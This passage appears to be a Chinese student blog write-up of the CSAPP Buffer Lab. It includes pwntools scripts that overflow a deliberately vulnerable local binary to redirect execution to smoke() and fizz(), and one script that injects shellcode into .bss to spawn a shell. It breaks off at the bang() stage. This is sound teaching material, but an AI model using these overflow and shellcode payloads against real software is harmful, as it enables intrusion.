\u672c\u83dc\u9e21\u5c31\u4e0d\u5728\u8fd9\u8fb9\u73b0\u5b66\u73b0\u5356\u4e86... \u66f4\u65b0 \u5927\u4f6c\uff1a \u751a\u81f3\u4e0d\u7528\u5173aslr\u5c31\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2ashell\uff0c\u6709\u7a7a\u518d\u6574 \u597d\uff0c\u819c\u3002\uff08\u4e24\u5206\u949f\u540e\uff09\u5927\u4f6c\uff1a \u7a81\u7136\u60f3\u8d77\u6765\u5b83 bss \u5e94\u8be5\u4e5f\u662f\u53ef\u6267\u884c\u7684\uff0c\u53ea\u8981\u628ashellcode\u5199\u5230 bss \u5c31\u884c\u4e86\uff0c\u4e0d\u7528\u90a3\u4e48\u9ebb\u70e6 \u6709\u9053\u7406\u3002\u641e\u8d77\uff1a 1 2 3 4 5 6 7 8 9 from pwn import * p = process ( argv = [ '/home/domain/Documents/SZU/CSAPP/4/bufbomb' , '-n' , '-t' , 'domain' ]) print ( p . recv ()) address = 0x080489C0 payload = 'a' * 0x20c + p32 ( address ) + p32 ( 0x0804A200 + 0x160 ) + p32 ( 0x0804A200 + 0x160 ) p . sendline ( payload ) p . sendline ( asm ( shellcraft . sh ())) p . interactive () \u786e\u5b9e\u4e0d\u9700\u8981\u5173\u95ed\u5730\u5740\u968f\u673a\u5316\u4e5f\u6210\u529f\u4e86\uff1a 1 2 3 4 5 6 7 8 9 / home / domain / IdeaProjects / pwntools / venv / bin / python / home / domain / IdeaProjects / pwntools / main . py [ x ] Starting local process '/home/domain/Documents/SZU/CSAPP/4/bufbomb' [ + ] Starting local process '/home/domain/Documents/SZU/CSAPP/4/bufbomb' : pid 5702 Team : domain Cookie : 0x6dfd74c3 [ * ] Switching to interactive mode ls main . py pwntools . iml venv \u73af\u5883\u8bf4\u660e \u4e0d\u7528\u8bf4\uff0c\u80af\u5b9a\u6709IDA\u3002 pwntools\uff0c\u5728Linux\u4e0b\u5f88\u65b9\u4fbf\uff0c\u6211\u5728IntelliJ IDEA\uff08\u6216\u8005PyCharm\uff09\u91cc\u5199\u4e5f\u5f88\u8212\u670d\u3002\u5bf9\u4e8eWindows\uff0c\u522b\u5fd8\u4e86\u6709WSL\uff0c\u4f60\u53ef\u4ee5\u53c2\u8003\u6211\u7684\u8fc7\u5f80\u7684\u6587\u7ae0\u6765\u90e8\u7f72pwntools\u3002 \u53e6\u5916\uff1a 1 2 3 4 5 6 7 8 domain @linux - 521 z : ~/ IdeaProjects / pwntools > . / venv / bin / checksec ~/ Documents / SZU / CSAPP / 4 / bufbomb [ * ] '/home/domain/Documents/SZU/CSAPP/4/bufbomb' Arch : i386 - 32 - little RELRO : No RELRO Stack : No canary found NX : NX disabled PIE : No PIE ( 0x8048000 ) RWX : Has RWX segments","title":"Buffer Lab"},{"location":"szu_courses/csapp/buffer_lab/#_1","text":"\u5bb9\u6211\u6284\u4e00\u4e0b\u5b9e\u9a8c\u7684PPT\uff1a","title":"\u5b9e\u9a8c\u8981\u6c42"},{"location":"szu_courses/csapp/buffer_lab/#_2","text":"\u5b9e\u9a8c\u653b\u51fb\u76ee\u6807\u7684\u7a0b\u5e8f\u4e3abufbomb\u3002\u8be5\u7a0b\u5e8f\u4e2d\u542b\u6709\u4e00\u4e2a\u5e26\u6709\u6f0f\u6d1e\u7684getbuf()\u51fd\u6570\uff0c\u5b83\u6240\u8c03\u7528\u7684\u7cfb\u7edf\u51fd\u6570gets()\u672a\u8fdb\u884c\u7f13\u51b2\u533a\u6ea2\u51fa\u4fdd\u62a4\u3002\u5176\u4ee3\u7801\u5982\u4e0b\uff1a 1 2 3 4 5 int getbuf () { char buf [ 12 ]; Gets ( buf ); return 1 ; } \u7cfb\u7edf\u51fd\u6570gets()\u4ece\u6807\u51c6\u8f93\u5165\u8bbe\u5907\u8bfb\u5b57\u7b26\u4e32\u51fd\u6570\u3002\u4ee5\u56de\u8f66\u7ed3\u675f\u8bfb\u53d6\uff0c\u4e0d\u4f1a\u5224\u65ad\u4e0a\u9650\uff0c\u6240\u4ee5\u7a0b\u5e8f\u5458\u5e94\u8be5\u786e\u4fddbuffer\u7684\u7a7a\u95f4\u8db3\u591f\u5927\uff0c\u4ee5\u4fbf\u5728\u6267\u884c\u8bfb\u64cd\u4f5c\u65f6\u4e0d\u53d1\u751f\u6ea2\u51fa\u3002","title":"\u76ee\u6807"},{"location":"szu_courses/csapp/buffer_lab/#_3","text":"\u76ee\u6807\u7a0b\u5e8fbufbomb\u5c06\u6267\u884ctest()\uff0c\u8fdb\u800c\u6267\u884cgetbuf()\uff0c\u6700\u7ec8\u6267\u884cgets()\u3002\u5176\u4e2dgets()\u4f1a\u4ece\u6807\u51c6\u8f93\u5165\u8bbe\u5907\u8bfb\u5165\u6570\u636e\u3002\u8981\u6c42\u9ed1\u5ba2\u540c\u5b66\u5229\u7528\u6240\u5b66\u77e5\u8bc6\uff0c\u6784\u9020\u9002\u5f53\u7684\u8f93\u5165\u6570\u636e\uff0c\u901a\u8fc7\u6807\u51c6\u8f93\u5165\u4f20\u9012\u5230\u76ee\u6807\u7a0b\u5e8f\uff0c\u5b9e\u73b0\u4ee5\u4e0b\u76ee\u7684\uff1a getbuf()\u8fd4\u56de\u65f6\uff0c\u4e0d\u8fd4\u56de\u5230test()\uff0c\u800c\u662f\u76f4\u63a5\u8fd4\u56de\u5230\u6307\u5b9a\u7684smoke()\u51fd\u6570\uff08\u8be5\u51fd\u6570\u5df2\u7ecf\u5b58\u5728\u4e8ebufbomb\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\uff09\u3002 getbuf()\u8fd4\u56de\u65f6\uff0c\u4e0d\u8fd4\u56de\u5230test()\uff0c\u800c\u662f\u76f4\u63a5\u8fd4\u56de\u5230\u6307\u5b9a\u7684fizz()\u51fd\u6570\uff08\u8be5\u51fd\u6570\u5df2\u7ecf\u5b58\u5728\u4e8ebufbomb\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\uff09\uff0c\u800c\u4e14\u8981\u6c42\u7ed9fizz()\u51fd\u6570\u4f20\u5165\u4e00\u4e2a\u9ed1\u5ba2cookie\u503c\u4f5c\u4e3a\u53c2\u6570\u3002\u5176\u4e2dcookie\u53ef\u4ee5\u901a\u8fc7makecookie\u5de5\u5177\u6839\u636e\u9ed1\u5ba2\u59d3\u540d\u4ea7\u751f\u2014\u2014\u201cmakecookie neo\u201d(neo\u8bf7\u66ff\u6362\u6210\u4f60\u7684\u540d\u5b57)\u3002 getbuf()\u8fd4\u56de\u65f6\uff0c\u4e0d\u8fd4\u56de\u5230test()\uff0c\u800c\u662f\u76f4\u63a5\u8fd4\u56de\u5230\u6307\u5b9a\u7684band()\u51fd\u6570\uff08\u8be5\u51fd\u6570\u5df2\u7ecf\u5b58\u5728\u4e8ebufbomb\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\uff09\uff0c\u5e76\u4e14\u5728\u8fd4\u56de\u5230band()\u4e4b\u524d\uff0c\u5148\u4fee\u6539\u5168\u5c40\u53d8\u91cfglobal_value\u4e3a\u4f60\u7684\u9ed1\u5ba2cookie\u503c\uff08cookie\u503c\u751f\u6210\u65b9\u6cd5\u4e0e\u4e0a\u4e00\u8981\u6c42\u76f8\u540c\uff09","title":"\u8981\u6c42"},{"location":"szu_courses/csapp/buffer_lab/#_4","text":"\u5df2\u77e5bufbomb\u4e2d\u6709test()\u51fd\u6570\u5c06\u4f1a\u8c03\u7528getbuf()\u51fd\u6570\uff0c\u5e76\u8c03\u7528gets()\u4ece\u6807\u51c6\u8f93\u5165\u8bbe\u5907\u8bfb\u5165\u5b57\u7b26\u4e32\u3002\u56e0\u6b64\u53ef\u4ee5\u901a\u8fc7\u5927\u4e8egetbuf()\u4e2d\u7ed9\u51fa\u7684\u6570\u636e\u7f13\u51b2\u533a\u7684\u5b57\u7b26\u4e32\u800c\u7834\u574fgetbuf()\u6808\u5e27\uff0c\u6539\u53d8\u5176\u8fd4\u56de\u5730\u5740\u2014\u2014\u6307\u5411\u6211\u4eec\u63d0\u4f9b\u7684\u653b\u51fb\u51fd\u6570\u3002","title":"\u64cd\u4f5c"},{"location":"szu_courses/csapp/buffer_lab/#_5","text":"\u8fd9\u4e2a\u7231\u770b\u4e0d\u770b\uff0c\u6211\u4e0b\u9762\u5199\u3002 \u4f7f\u7528gdb\u548cobjdump\u5206\u6790\u5176\u6808\u5e27\u7ed3\u6784\uff0c\u786e\u5b9atest()\u8c03\u7528getbuf()\u540e\u8fd4\u56de\u5730\u5740\u4e0ebuf\u7f13\u51b2\u533a\u76f8\u5bf9\u4f4d\u7f6e\u5173\u7cfb\uff1b \u6839\u636e\u76ee\u6807\u653b\u51fb\u51fd\u6570\u5730\u5740\uff0c\u6784\u9020\u51fa\u4f20\u7ed9gets()\u7684\u6570\u636e\uff08\u7528\u4e8e\u586b\u5145\u7f13\u51b2\u533a\u5e76\u7834\u574f\u6808\u5e27\u7ed3\u6784\uff09\u3002\u5c06\u6240\u6784\u9020\u7684\u6570\u636e\u6bcf\u5b57\u8282\u752816\u8fdb\u5236\u6570\u5b57\u8868\u793a\uff08\u6587\u672c\u5b57\u7b26\u4e32\uff0c\u4f8b\u59820x3\u7528\u4e24\u4e2a\u5b57\u7b26\u8868\u793a\u4e3a\u201c03\u201d\uff09\uff0c\u5e76\u4fdd\u5b58\u5728exploit.txt\u6587\u4ef6\u4e2d\u3002 \u5c06exploit.txt\u6587\u672c\u6587\u4ef6\u4e2d\u7684\u6570\u636e\u901a\u8fc7sendstring\u5de5\u5177\u8f6c\u6362\u6210char\u7c7b\u578b\u7684\u6570\u636e\u2014\u2014\u4fdd\u5b58\u5728exploit raw.txt\u4e2d\u3002\u6bd4\u5982\u5229\u7528\u7ba1\u9053\u201ccat exploit.txt | ./sendstring | ./exploit raw.txt\u201d\u6216\u901a\u8fc7\u91cd\u5b9a\u5411\u201c./sendstring < exploit.txt > exploit_raw.txt\u201d \u6267\u884cbufbomb\uff0c\u5e76\u5c06\u8f6c\u6362\u540e\u7684\u6570\u636e\u4f5c\u4e3a\u6807\u51c6\u8f93\u5165\u6570\u636e\u4f20\u5165bufbomb\u3002\u5177\u4f53\u65b9\u6cd5\u6709\u591a\u79cd\uff0c\u4f8b\u5982\u201ccat exploit raw.txt | bufbomb \u2013t neo\u201d\u3001\u201cbufbomb -t neo< exploit raw.txt\u201d\u3002\u5176\u4e2dneo\u8bf7\u66ff\u6362\u6210\u540c\u5b66\u81ea\u5df1\u7684\u540d\u5b57\u3002 \u5c06\u53c2\u6570\u4f20\u5165bufbomb\u65f6\uff0c\u4e5f\u53ef\u6307\u76f4\u63a5\u4eceexploit.txt\u6587\u4ef6\u5f00\u59cb\uff0c\u6267\u884c\u201c$ cat exploit.txt | ./sendstring | ./bufbomb -t neo\u201d\u3002\u65e0\u9700exploit_raw.txt\u7684\u4e2d\u8f6c\uff0c\u76f4\u63a5\u7531sendstring\u901a\u8fc7\u7ba1\u9053\u8f93\u5165\u5230bufbomb\u7684\u6807\u51c6\u8f93\u5165\u8bbe\u5907\u4e2d\u3002","title":"\u5177\u4f53\u64cd\u4f5c"},{"location":"szu_courses/csapp/buffer_lab/#_6","text":"\u8fd9\u4e2a\u771f\u7684...\u5f88\u96be\u8bb2\u6e05\u695a\u662f\u600e\u4e48\u56de\u4e8b\uff0c\u6211\u89c9\u5f97\u4e3b\u8981\u8fd8\u662f\u81ea\u5df1\u8c03\u51e0\u6b21\u5c31\u4f1a\u5f88\u76f4\u89c2\u4e86\u3002 \u66f4\u65b0\uff1a\u4f60\u53ef\u4ee5\u7528\u5f88\u591a\u79cd\u65b9\u5f0f\u6765\u505a\u8fd9\u4e2a\u5b9e\u9a8c\u3002\u6211\u518d\u5e9f\u8bdd\u51e0\u53e5\u597d\u4e86\u3002 \u73b0\u5728\u5b9e\u9a8c\u662f\u7ed9\u51fa\u4e86\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5b83\u7684\u51fd\u6570\u8c03\u7528\u5b58\u5728\u6f0f\u6d1e\uff0c\u4f60\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\u7834\u574f\u6808\u4e0a\u7684\u6570\u636e\u6765\uff0c\u4f8b\u5982\u4f7f\u51fd\u6570\u8fd4\u56de\u5230\u4f60\u6240\u6307\u5b9a\u7684\u51fd\u6570\u4e0a\uff0c\u751a\u81f3\u662f\u83b7\u5f97\u76ee\u6807\u4e3b\u673a\u7684\u8bbf\u95ee\u6216\u662f\u63a7\u5236\u6743\uff08getshell\uff09\u3002\u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u6211\u8fd8\u662f\u5efa\u8bae\u67e5\u770b \u8fd9\u91cc \u3002","title":"\u5f00\u59cb\u6298\u817e"},{"location":"szu_courses/csapp/buffer_lab/#smoke","text":"\u4e0d\u7ba1\u4e0a\u9762\u600e\u4e48\u8bf4\uff0c\u53cd\u6b63\u6211\u53ea\u8bb0\u4f4f\u4e86\u8981\u6c42\u3002\u5148run\u4e00\u4e0b\u770b\u770b\uff1a \u8981\u6c42\u5fc5\u987b\u6307\u5b9a\u4e00\u4e2a\u961f\u4f0d\u540d\u79f0\u3002\u6307\u5b9a\u4e00\u4e2a\u8bd5\u8bd5\uff0c\u7136\u540e\u968f\u610f\u8f93\u4e86\u4e00\u4e2a\u5b57\u7b26\u4e32\uff1a \u5927\u6982\u4e86\u89e3\u4e86\u3002\u628abufbomb\u62d6\u5230IDA\u91cc\uff0c\u5f00\u59cb\u8c03\u8bd5\u3002 \u8ddf\u968f\u7a0b\u5e8f\u6d41\u7a0b\uff0c\u8fdb\u5165 launch() \uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 int __usercall launch @ < eax > ( int a1 @ < eax > , int a2 @ < edx > ) { int v2 ; // ebx void * v3 ; // esp int result ; // eax char v5 ; // [esp+1Bh] [ebp-3Dh] int savedregs ; // [esp+58h] [ebp+0h] v2 = a1 ; v3 = alloca ( a2 + ((( unsigned __int16 ) & savedregs - 72 ) & 0x3FF8 ) + 15 ); memset (( void * )(( unsigned int ) & v5 & 0xFFFFFFF0 ), 244 , a2 + ((( unsigned __int16 ) & savedregs - 72 ) & 0x3FF8 )); if ( ! quiet ) { if ( hexformat ) printf ( \"Type Hex string:\" ); else printf ( \"Type string:\" ); } if ( v2 ) { testn (); result = success ; if ( success ) return result ; LABEL_8 : result = puts ( \"Better luck next time\" ); success = 0 ; return result ; } test (); result = success ; if ( ! success ) goto LABEL_8 ; return result ; } \u968f\u540e\u8df3\u8fdb\u4e86 test() \uff1a C 1 2 3 4 5 6 7 8 9 10 int test () { signed int v0 ; // edx v0 = getbuf (); if ( v0 != cookie ) return printf ( \"Dud: getbuf returned 0x%x \\n \" , v0 ); printf ( \"Boom!: getbuf returned 0x%x \\n \" , v0 ); return validate ( 3 ); } ASM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 .text: 08048 DA0 ; =============== S U B R O U T I N E ======================================= .text: 08048 DA0 .text: 08048 DA0 ; Attributes: bp-based frame .text: 08048 DA0 .text: 08048 DA0 public test .text: 08048 DA0 test proc near ; CODE XREF: launch:loc_8049080\u2193p .text: 08048 DA0 .text: 08048 DA0 var_4 = dword ptr - 4 .text: 08048 DA0 .text: 08048 DA0 push ebp .text: 08048 DA1 mov ebp , esp .text: 08048 DA3 sub esp , 18 h .text: 08048 DA6 mov [ ebp + var_4 ], 0 DEADBEEFh .text: 08048 DAD call getbuf .text: 08048 DB2 mov edx , eax .text: 08048 DB4 mov eax , [ ebp + var_4 ] .text: 08048 DB7 cmp eax , 0 DEADBEEFh .text: 08048 DBC jz short loc_8048DD0 .text: 08048 DBE mov dword ptr [ esp ], offset aSabotagedTheSt ; \"Sabotaged!: the stack has been corrupte\"... .text: 08048 DC5 call _puts .text: 08048 DCA leave .text: 08048 DCB retn .text: 08048 DCB ; --------------------------------------------------------------------------- .text: 08048 DCC align 10 h .text: 08048 DD0 .text: 08048 DD0 loc_8048DD0 : ; CODE XREF: test+1C\u2191j .text: 08048 DD0 cmp edx , ds : cookie .text: 08048 DD6 jz short loc_8048DF0 .text: 08048 DD8 mov [ esp + 4 ], edx .text: 08048 DDC mov dword ptr [ esp ], offset aDudGetbufRetur ; \"Dud: getbuf returned 0x%x\\n\" .text: 08048 DE3 call _printf .text: 08048 DE8 leave .text: 08048 DE9 retn .text: 08048 DE9 ; --------------------------------------------------------------------------- .text: 08048 DEA align 10 h .text: 08048 DF0 .text: 08048 DF0 loc_8048DF0 : ; CODE XREF: test+36\u2191j .text: 08048 DF0 mov [ esp + 4 ], edx .text: 08048 DF4 mov dword ptr [ esp ], offset aBoomGetbufRetu ; \"Boom!: getbuf returned 0x%x\\n\" .text: 08048 DFB call _printf .text: 08048 E00 mov dword ptr [ esp ], 3 .text: 08048 E07 call validate .text: 08048 E0C leave .text: 08048 E0D retn .text: 08048 E0D test endp .text: 08048 E0D .text: 08048 E0D ; --------------------------------------------------------------------------- .text: 08048 E0E align 10 h \u518d\u8fdb\u5165 getbuf() \uff1a 1 2 3 4 5 6 7 signed int getbuf () { char v1 ; // [esp+10h] [ebp-18h] Gets ( & v1 ); return 1 ; } \u597d\u4e86\uff0c\u91cd\u70b9\u6765\u4e86\u3002\u5148\u6765\u770b\u770b\u6808\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 FFFAF240 F7FB9FC0 ld_2 .29 . so : __libc_enable_secure + CC FFFAF244 08048448 LOAD : byte_8048448 FFFAF248 00000000 FFFAF24C 9 C117200 FFFAF250 00000000 FFFAF254 F7D8C430 libc_2 .29 . so : __evoke_link_warning_getwd + B3F0 FFFAF258 00000000 FFFAF25C 00000000 FFFAF260 08 BBD580 [ heap ] : 08 BBD580 FFFAF264 FFFFFFFF FFFAF268 FFFAF288 [ stack ] : FFFAF288 FFFAF26C 08048 DB2 test + 12 Tip What is the x86 \u201cret\u201d instruction equivalent to? \u5f53\u524d v1 \u7684\u5730\u5740\u662f 0xFFFAF250 \uff0c\u6240\u4ee5\u9700\u8981\u4e00\u8def\u8986\u76d6\u5230 0xFFFAF268 \uff0c\u4e00\u51714\u00d77=28\u4e2a char \uff0c\u7136\u540e\u5c06 smoke() \u7684\u5730\u5740 0x08048EB0 \u7ed9\u5230\u8fd4\u56de\u5730\u5740 0xFFFAF26C \u4e0a\u5c31\u53ef\u4ee5\u4e86\u3002\u4e8e\u662f\u6709exp.py\uff1a Tip \u6ce8\u610f\uff0c\u8fd9\u91cc\u4f7f\u7528\u7684\u5de5\u5177\u662f pwntools \uff0c\u8fd9\u53ef\u4ee5\u5927\u5e45\u63d0\u9ad8\u4f60\u7684\u6548\u7387\u3002\u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u4f60\u53ef\u4ee5\u67e5\u770b \u6587\u6863 \u3002\u5728Linux\u7cfb\u7edf\u4e0a\u8fdb\u884c\u5b89\u88c5\u662f\u6bd4\u8f83\u7b80\u5355\u7684\uff0c\u53ea\u9700\u8981\u53c2\u8003\u6587\u6863\u4e2d\u7684\u51e0\u53e5\u547d\u4ee4\u5373\u53ef\u3002\u53e6\u5916\uff0c\u5bf9\u4e8eWindows\u7cfb\u7edf\uff0c\u4f60\u53ef\u4ee5\u5229\u7528WSL\u6765\u4f7f\u7528\u5b83\u3002\u4f60\u53ef\u4ee5\u53c2\u8003\u6211\u8fc7\u5f80\u7684\u6587\u7ae0\u6765\u8fdb\u884c\u5b89\u88c5\uff0c\u53ef\u4ee5\u5728\u5de6\u4fa7\u680f\u6216\u662f\u4e0a\u65b9\u641c\u7d22\u6846\u4e2d\u627e\u5230\u3002 1 2 3 4 5 6 7 8 from pwn import * p = process ( argv = [ '/home/domain/Documents/SZU/CSAPP/4/bufbomb' , '-t' , 'domain' ]) print ( p . recv ()) address = 0x08048EB0 payload = 'a' * 28 + p32 ( address ) p . sendline ( payload ) print ( p . recv ()) \u53ef\u4ee5\u5f97\u5230\u7ed3\u679c\uff1a 1 2 3 4 5 6 7 8 9 10 11 / home / domain / IdeaProjects / pwntools / venv / bin / python / home / domain / IdeaProjects / pwntools / main . py [ x ] Starting local process ' /home/domain/Documents/SZU/CSAPP/4/bufbomb ' [ + ] Starting local process ' /home/domain/Documents/SZU/CSAPP/4/bufbomb ' : pid 21751 Team : domain Cookie : 0 x6dfd74c3 Type string : Smoke ! : You called smoke () [ * ] Stopped process ' /home/domain/Documents/SZU/CSAPP/4/bufbomb ' ( pid 21751 ) Process finished with exit code 0 \u53ef\u4ee5\u770b\u5230\u5df2\u7ecf\u8f93\u51fa\u4e86\u8c03\u7528\u4e86 smoke() \u7684\u4fe1\u606f\uff0c\u518d\u770b\u770b smoke() \u51fd\u6570\uff1a 1 2 3 4 5 6 void __noreturn smoke () { puts ( \"Smoke!: You called smoke()\" ); validate ( 0 ); exit ( 0 ); } \u5e94\u8be5\u5df2\u7ecf\u6210\u529f\u3002 Tip \u6211\u77e5\u9053\u603b\u662f\u4f1a\u6709\u4eba\u95ee\u6211\u4e0d\u60f3\u7528pwntools\u600e\u4e48\u529e\u3002\u5bf9\u4e8e\u8fd9\u4e00\u9898\u6765\u8bf4\uff0c\u4f60\u53ef\u4ee5\u51c6\u5907\u597dpayload\uff0c\u5c31\u50cf\u8fd9\u6837\uff1a \u7136\u540e\uff0c\u8fd9\u6837\u5b50\uff1a 1 cat . / payload | . / sendstring | . / bufbomb - t domain \u5c31\u53ef\u4ee5\u5f97\u5230\uff1a \u53ef\u4ee5\u770b\u5230\uff0c\u6210\u529f\u5730\u8c03\u7528\u4e86 smoke() \u3002 \u53e6\u5916\uff0c\u63a5\u4e0b\u6765\u6211\u662f\u4e0d\u4f1a\u7ee7\u7eed\u8bb2\u4e0d\u7528pwntools\u600e\u4e48\u529e\u7684\u3002","title":"smoke()"},{"location":"szu_courses/csapp/buffer_lab/#fizz","text":"\u8fd9\u56de\u9700\u8981\u8c03\u7528\u4e00\u4e2a\u51fd\u6570\u5e76\u4e14\u4f20\u5165\u53c2\u6570\u3002\u6839\u636e\u8981\u6c42\u6211\u4eec\u5148\u6765 makecookie \uff1a \u597d\uff0c\u5148\u7559\u4e0bdomain\u7684Cookie\uff1a 1 0 x6dfd74c3 \u5907\u7528\u3002\u6765\u770b\u770b fizz() \uff1a C, decompiled by IDA 1 2 3 4 5 6 7 8 9 10 11 12 13 void __cdecl __noreturn fizz ( int a1 ) { if ( a1 == cookie ) { printf ( \"Fizz!: You called fizz(0x%x) \\n \" , a1 ); validate ( 1 ); } else { printf ( \"Misfire: You called fizz(0x%x) \\n \" , a1 ); } exit ( 0 ); } ASM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 .text: 08048 E60 ; =============== S U B R O U T I N E ======================================= .text: 08048 E60 .text: 08048 E60 ; Attributes: noreturn bp-based frame .text: 08048 E60 .text: 08048 E60 public fizz .text: 08048 E60 fizz proc near .text: 08048 E60 .text: 08048 E60 arg_0 = dword ptr 8 .text: 08048 E60 .text: 08048 E60 push ebp .text: 08048 E61 mov ebp , esp .text: 08048 E63 sub esp , 8 .text: 08048 E66 mov eax , [ ebp + 8 ] .text: 08048 E69 cmp eax , ds : cookie .text: 08048 E6F jz short loc_8048E90 .text: 08048 E71 mov [ esp + 4 ], eax .text: 08048 E75 mov dword ptr [ esp ], offset aMisfireYouCall ; \"Misfire: You called fizz(0x%x)\\n\" .text: 08048 E7C call _printf .text: 08048 E81 .text: 08048 E81 loc_8048E81 : ; CODE XREF: fizz+4C\u2193j .text: 08048 E81 mov dword ptr [ esp ], 0 ; status .text: 08048 E88 call _exit .text: 08048 E88 ; --------------------------------------------------------------------------- .text: 08048 E8D align 10 h .text: 08048 E90 .text: 08048 E90 loc_8048E90 : ; CODE XREF: fizz+F\u2191j .text: 08048 E90 mov [ esp + 4 ], eax .text: 08048 E94 mov dword ptr [ esp ], offset aFizzYouCalledF ; \"Fizz!: You called fizz(0x%x)\\n\" .text: 08048 E9B call _printf .text: 08048 EA0 mov dword ptr [ esp ], 1 .text: 08048 EA7 call validate .text: 08048 EAC jmp short loc_8048E81 .text: 08048 EAC fizz endp .text: 08048 EAC .text: 08048 EAC ; --------------------------------------------------------------------------- .text: 08048 EAE align 10 h \u9700\u8981\u4e00\u4e2a\u53c2\u6570\uff0c\u6240\u4ee5\u53ef\u4ee5\u6709exp.py\uff1a 1 2 3 4 5 6 7 8 from pwn import * p = process ( argv = [ '/home/domain/Documents/SZU/CSAPP/4/bufbomb' , '-t' , 'domain' ]) print ( p . recv ()) address = 0x08048E60 payload = 'a' * 28 + p32 ( address ) + p32 ( 0x00000000 ) + p32 ( 0x6dfd74c3 ) p . sendline ( payload ) print ( p . recv ()) \u53ef\u4ee5\u5f53\u4f5c\u5c31\u662f\u5728\u4e0a\u6b21\u7684\u57fa\u7840\u4e0a\u6539\u4e86\u4e2a\u51fd\u6570\u5730\u5740 fizz \uff08 0x08048E60 \uff09\uff0c\u5916\u52a0\u628a\u53c2\u6570\u653e\u4e0a\u53bb\u3002\u4f60\u53ef\u80fd\u60f3\u77e5\u9053\u4e3a\u4ec0\u4e48\u662f\u8fd9\u6837\uff0c\u4e5f\u53ef\u80fd\u60f3\u77e5\u9053\u90a3\u4e2a\u5947\u602a\u76840\u586b\u5145\u662f\u4ec0\u4e48\uff0c\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u53ef\u4ee5\u9002\u5f53\u5730\u5728\u4e0a\u9762\u7684\u811a\u672c\u52a0 pause() \uff0c\u7136\u540e\u7528IDA Attach to process... \uff0c\u9009\u4e2d bufbomb \u5c31\u53ef\u4ee5\u5f00\u59cb\u8c03\u8bd5\u8fd9\u4e2a\u8fdb\u7a0b\u4e86\u3002 Warning \u8c03\u8bd5\u662f\u5f88\u91cd\u8981\u7684\u3002\u8981\u662f\u8ba9\u6211\u53ea\u770b\u4ee3\u7801\u4e0d\u8c03\u8bd5\uff0c\u6211\u53ef\u80fd\u51e0\u4e4e\u5199\u4e0d\u51fapayload\u3002\u800c\u4e14\uff0c\u5f53\u4f60\u7684\u8f93\u5165\u5e76\u6ca1\u6709\u5f97\u5230\u9884\u671f\u7684\u7ed3\u679c\u65f6\uff0c\u5982\u679c\u4f60\u4e0d\u8fdb\u884c\u8c03\u8bd5\u662f\u5f88\u96be\u53d1\u73b0\u95ee\u9898\u6240\u5728\u7684\u3002\u5173\u4e8e\u5982\u4f55\u8fdb\u884c\u8c03\u8bd5\uff0c\u4f60\u5f88\u5feb\u5c31\u4f1a\u5728\u5de6\u4fa7\u680f\u6216\u662f\u4e0a\u65b9\u641c\u7d22\u6846\u4e2d\u627e\u5230\u76f8\u5173\u6587\u7ae0\uff08\u6216\u8bb8\u5427\uff09\u3002 \u770b\u770b\u8fd9\u6b21\u7684\u6808\uff1a 1 2 3 4 5 6 7 8 9 10 11 FFEC7250 61616161 FFEC7254 61616161 FFEC7258 61616161 FFEC725C 61616161 FFEC7260 61616161 FFEC7264 61616161 FFEC7268 61616161 FFEC726C 61616161 FFEC7270 00000000 FFEC7274 6 DFD74C3 FFEC7278 FFEC7200 [ stack ] : FFEC7200 \u6b64\u65f6\u6267\u884c\u5230 0x08048E66 \uff1a 1 2 3 4 5 6 .text: 08048 E60 push ebp .text: 08048 E61 mov ebp , esp .text: 08048 E63 sub esp , 8 .text: 08048 E66 mov eax , [ ebp + 8 ] .text: 08048 E69 cmp eax , ds : cookie .text: 08048 E6F jz short loc_8048E90 \u8fd9\u4e2a\u65f6\u5019 EBP \u662f 0xFFEC726C \uff0c\u51fd\u6570 fizz() \u53c2\u6570\u5c06\u4ece 0xFFEC7274 \u4e0a\u53d6\u503c\uff0c\u6211\u4eec\u5df2\u7ecf\u5c06Cookie\u8986\u76d6\u4e0a\u53bb\u4e86\uff0c\u6240\u4ee5\u6ca1\u6709\u95ee\u9898\uff1a 1 2 3 4 5 6 7 8 9 10 11 / home / domain / IdeaProjects / pwntools / venv / bin / python / home / domain / IdeaProjects / pwntools / main . py [ x ] Starting local process ' /home/domain/Documents/SZU/CSAPP/4/bufbomb ' [ + ] Starting local process ' /home/domain/Documents/SZU/CSAPP/4/bufbomb ' : pid 16217 Team : domain Cookie : 0 x6dfd74c3 Type string : Fizz ! : You called fizz ( 0 x6dfd74c3 ) [ * ] Stopped process ' /home/domain/Documents/SZU/CSAPP/4/bufbomb ' ( pid 16217 ) Process finished with exit code 0 \u4f60\u8981\u662f\u8fd8\u5728\u7ea0\u7ed3\u90a3\u4e2a32\u4f4d\u76840\u586b\u5145\u662f\u5565\u53ef\u4ee5\u627e\u4e2a\u6b63\u5e38\u7684\u51fd\u6570\u8fb9\u8c03\u8fb9\u770b\u770b\u6808\u5c31\u77e5\u9053\u5566\uff0c\u8fd9\u548c\u51fd\u6570\u8c03\u7528\u7ea6\u5b9a\u76f8\u5173\u3002\u53e6\u5916\uff0c\u770b\u4e86\u4e0b\u9762\u8fd9\u5173\u6216\u8bb8\u4f60\u4e5f\u5c31\u77e5\u9053\u4e86\u3002","title":"fizz()"},{"location":"szu_courses/csapp/buffer_lab/#bang","text":"\u8fd9\u56de\u662f\u8981\u5148\u6539\u53d8\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf global_value \u7684\u503c\uff0c\u7136\u540e\u518d\u8df3\u8f6c\u5230 bang() 